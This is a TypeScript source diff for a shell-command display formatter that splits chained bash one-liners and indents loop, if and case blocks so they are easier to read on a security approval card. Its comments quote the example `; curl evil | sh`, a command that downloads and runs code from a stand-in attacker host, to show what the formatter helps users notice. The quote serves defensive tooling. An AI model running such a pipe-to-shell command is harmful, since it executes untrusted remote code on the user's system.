@@ -1,54 +1,212 @@
+// Control-flow keywords the splitter understands. `do`/`then` close a block
+// header and open its body, `done`/`fi`/`esac` close a block, and `else`/`elif`
+// do both.
+const BLOCK_OPEN = new Set(['do', 'then', 'else'])
+const BLOCK_CLOSE = new Set(['done', 'fi', 'esac', 'else', 'elif'])
+// Keywords that start a block header, and the keyword that closes that header.
+// Everything up to the closer is one condition (or, for a case, one subject), so
+// a `;`/`&&`/`||` inside it must NOT start a new line - `if a && b; then` is one
+// step, not two.
+const BLOCK_HEADER: Record<string, 'block' | 'case'> = {
+  for: 'block',
+  select: 'block',
+  while: 'block',
+  until: 'block',
+  if: 'block',
+  elif: 'block',
+  case: 'case',
+}
+
+// Spaces a block body is indented by. The user can change it in the Settings
+// Browser tab (0 leaves bodies flush left); see lib/chatPrefs.
+export const DEFAULT_BASH_INDENT = 4
+export const MAX_BASH_INDENT = 8
+
+// bareWordAt returns the unquoted lowercase word starting at i, provided it is a
+// whole token (the character after it delimits). The caller is responsible for
+// only asking when i is in command position - in `echo done` the `done` is an
+// argument, not a keyword.
+function bareWordAt(cmd: string, i: number): string {
+  const match = /^[a-z]+/.exec(cmd.slice(i))
+  if (!match) return ''
+  const after = cmd[i + match[0].length]
+  return after === undefined || /[\s;&|()<>]/.test(after) ? match[0] : ''
+}
+
 // splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
-// chained one-liner reads as separate steps. It is deliberately optimistic: it
-// only tracks quotes and backslash escapes, not the full shell grammar, and a
-// command that already contains newlines is left exactly as written.
+// chained one-liner reads as separate steps, and lays a `for`/`while`/`until`/
+// `if`/`case` block out over its own indented lines. `indent` is the number of
+// spaces per level (0 leaves bodies flush left). It is deliberately optimistic:
+// it only tracks quotes, backslash escapes and command position, not the full
+// shell grammar, and a command that already contains newlines is left exactly as
+// written.
 //
-// It is DISPLAY-ONLY and insert-only: it never removes, reorders, or rewrites a
-// character, so every byte of the original command is still shown in the same
-// order (just with extra line breaks). That property is what makes it safe to use
-// on the security approval card - the text a user approves is byte-for-byte the
-// command that runs; splitting merely makes a buried `; curl evil | sh` easier to
-// spot, never harder.
-export function splitBashChains(cmd: string): string {
+// It is DISPLAY-ONLY. The only edits it makes are inserting line breaks and
+// leading indentation, and dropping the run of spaces that a break just turned
+// into trailing whitespace - every other byte of the original command is still
+// shown, in the same order. That property is what makes it safe to use on the
+// security approval card: the text a user approves is the command that runs;
+// splitting merely makes a buried `; curl evil | sh` easier to spot, never
+// harder.
+export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDENT): string {
   if (cmd.includes('\n')) return cmd
+  const pad = ' '.repeat(Math.min(MAX_BASH_INDENT, Math.max(0, Math.trunc(indent) || 0)))
   let out = ''
+  // The next break to emit, flushed lazily so the indent is computed at the
+  // depth the line it starts actually sits at (a line opening with `done` has
+  // already dropped a level by the time the break is written).
+  let pending = ''
+  // The open blocks, innermost last: a `do`/`then` body, a `case` whose patterns
+  // are being listed, or one `pattern)` arm of a case. Every entry is exactly one
+  // indent level, so the stack's depth IS the indent depth.
+  const stack: ('block' | 'case' | 'branch')[] = []
+  // Unclosed `(` outside quotes, so the `)` that ends a case pattern can be told
+  // apart from one closing `$( )` / `( )` / `(( ))`.
+  let parens = 0
   let inSingle = false
   let inDouble = false
   let escaped = false
+  // Whether the next bare word starts a command - only there is `done` the
+  // keyword rather than an argument.
+  let commandStart = true
+  // Which block header we are inside, if any: between `if`/`for`/... and its
+  // `then`/`do`, or between `case` and its `in`. Chain operators there join one
+  // condition instead of separating steps.
+  let header: '' | 'block' | 'case' = ''
+
+  const emit = (text: string) => {
+    if (pending) {
+      out += pending === '\n' ? '\n' + pad.repeat(stack.length) : pending
+      pending = ''
+    }
+    out += text
+  }
+  // Start the body of a block that the keyword at i just opened, skipping the
+  // spaces the break makes trailing.
+  const openBody = (i: number, kind: 'block' | 'case') => {
+    stack.push(kind)
+    header = ''
+    pending = '\n'
+    let j = i
+    while (cmd[j + 1] === ' ' || cmd[j + 1] === '\t') j++
+    commandStart = true
+    return j
+  }
+
   for (let i = 0; i < cmd.length; i++) {
     const ch = cmd[i]
-    out += ch
     if (escaped) {
+      emit(ch)
       escaped = false
       continue
     }
     if (ch === '\\') {
+      emit(ch)
       escaped = true
+      commandStart = false
       continue
     }
     if (ch === "'" && !inDouble) {
+      emit(ch)
       inSingle = !inSingle
+      commandStart = false
       continue
     }
     if (ch === '"' && !inSingle) {
+      emit(ch)
       inDouble = !inDouble
+      commandStart = false
       continue
     }
-    if (inSingle || inDouble) continue
-    // `;` splits (but not `;;`, a case terminator); `&&`/`||` split after the
-    // second character. A single `|` (pipe) or `&` (background/redirect) does
-    // not.
-    const isChain = (ch === ';' && cmd[i + 1] !== ';') || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
-    if (!isChain) continue
-    if (ch !== ';') out += cmd[++i]
-    while (cmd[i + 1] === ' ') i++
+    if (inSingle || inDouble) {
+      emit(ch)
+      continue
+    }
+
+    // `case <subject> in`: the `in` closes the header, and unlike `do`/`then` it
+    // follows the subject rather than sitting in command position - so it is
+    // matched on a plain word boundary. `for x in ...` is unaffected: its header
+    // is a 'block' one, closed by `do`.
+    if (header === 'case' && bareWordAt(cmd, i) === 'in' && (i === 0 || /[\s;&|()]/.test(cmd[i - 1]))) {
+      emit('in')
+      i = openBody(i + 1, 'case')
+      continue
+    }
+
+    const keyword = commandStart ? bareWordAt(cmd, i) : ''
+    if (keyword && (BLOCK_OPEN.has(keyword) || BLOCK_CLOSE.has(keyword) || keyword in BLOCK_HEADER)) {
+      if (BLOCK_CLOSE.has(keyword)) {
+        // The final `;;` of a case is optional, so `esac` may still be inside the
+        // last arm - leave that arm before closing the case itself.
+        if (keyword === 'esac' && stack[stack.length - 1] === 'branch') stack.pop()
+        stack.pop()
+        header = ''
+        if (out && pending !== '\n') pending = '\n'
+      }
+      emit(keyword)
+      i += keyword.length - 1
+      commandStart = false
+      if (keyword in BLOCK_HEADER) header = BLOCK_HEADER[keyword]
+      if (BLOCK_OPEN.has(keyword)) i = openBody(i, 'block')
+      continue
+    }
+
+    // The `)` that ends a case pattern opens that arm: its first command stays on
+    // the pattern line (`a) echo a ;;` is the whole point of a one-line case) and
+    // any further command in the arm indents under it. A `(a|b)` pattern works
+    // because a `(` in pattern position is part of the pattern, not a subshell.
+    const inPatterns = stack[stack.length - 1] === 'case'
+    if (ch === '(' && !(inPatterns && commandStart)) {
+      emit(ch)
+      parens++
+      commandStart = true
+      continue
+    }
+    if (ch === ')') {
+      emit(ch)
+      commandStart = false
+      if (parens > 0) parens--
+      else if (inPatterns) {
+        stack.push('branch')
+        commandStart = true
+      }
+      continue
+    }
+
+    // `;;` - and the `;&` / `;;&` fall-through spellings - end a case arm.
+    const terminator = /^(?:;;&|;;|;&)/.exec(cmd.slice(i, i + 3))?.[0]
+    if (terminator) {
+      emit(terminator)
+      i += terminator.length - 1
+      if (stack[stack.length - 1] === 'branch') stack.pop()
+      while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
+      commandStart = true
+      if (i + 1 < cmd.length) pending = '\n'
+      continue
+    }
+
+    // `;` splits; `&&`/`||` split after the second character. A single `|` (pipe)
+    // or `&` (background/redirect) does not, though both still put what follows
+    // in command position.
+    const isChain = ch === ';' || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
+    if (!isChain) {
+      emit(ch)
+      if (/[&|{!]/.test(ch)) commandStart = true
+      else if (!/\s/.test(ch)) commandStart = false
+      continue
+    }
+    emit(ch)
+    if (ch !== ';') emit(cmd[++i])
+    while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
+    commandStart = true
+    if (i + 1 >= cmd.length) continue
     // Keep the conventional error-suppression suffixes attached to the command
     // they qualify. Splitting `command -v bun || true` (or `... || :`) leaves a
     // visually orphaned no-op on its own line and makes the script harder, not
     // easier, to scan. Other control chains still split normally.
     const rest = cmd.slice(i + 1).trim()
     const trivialFallback = ch === '|' && /^(?:true|:)\s*$/.test(rest)
-    if (i + 1 < cmd.length) out += trivialFallback ? ' ' : '\n'
+    pending = header || trivialFallback ? ' ' : '\n'
   }
   return out
 }
@@ -249,8 +407,8 @@ function quoteShellPath(path: string): string {
   return /^[A-Za-z0-9_./-]+$/.test(path) ? path : `'${path.replace(/'/g, `'"'"'`)}'`
 }
 
-export function formatBashForDisplay(command: string, cwd?: string): string {
-  const script = dropRedundantSemicolons(splitBashChains(dropNoopCd(stripLineContinuations(unwrapBashLoginCommand(command)))))
+export function formatBashForDisplay(command: string, cwd?: string, indent: number = DEFAULT_BASH_INDENT): string {
+  const script = dropRedundantSemicolons(splitBashChains(dropNoopCd(stripLineContinuations(unwrapBashLoginCommand(command))), indent))
   if (!cwd || cwd === '.' || /^\s*cd(?:\s|$)/.test(script)) return script
   return `cd ${quoteShellPath(cwd)}\n${script}`
 }
